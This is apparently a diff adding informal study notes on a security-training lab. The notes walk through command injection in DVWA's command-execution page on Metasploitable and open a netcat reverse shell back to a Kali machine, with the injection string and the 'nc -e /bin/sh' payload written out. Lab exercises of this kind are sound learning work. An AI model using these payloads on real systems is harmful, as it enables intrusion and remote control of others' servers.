@@ -1,0 +1,41 @@
+Allows an attacket to execute OS commands
+windows or linux commands
+can be used to get a reverse shell
+or upload any file using wget command
+code execution commands attached in the resources
+
+go to metasploitable
+in browser
+ip/dvwa
+go to command execution
+ping for free
+check what input box can do
+put ip address of kali
+and ping
+lets see we can exploit it
+how to exploit it
+10.20.20.103; pwd
+to execute two commands together 
+ls;pwd
+if it executes pwd then we can insert any linux command
+
+reverse connection
+commands in php, perl, ruby, netcat, python
+
+we use netcat
+go to kali machine
+nc -vv -l -p 8080
+vv - means verbose
+l - listen
+port is 8080
+
+go to webserver and try to connect to kali
+nc -e /bin/sh 10.20.(ip of kali) 8080
+
+go to webserver in dvwa
+execute command
+ip ; nc -e /bin/sh 10.20(ip of kali) 8080
+go to kali and see if it has any message with unknown connection
+if it connects
+run any command
+
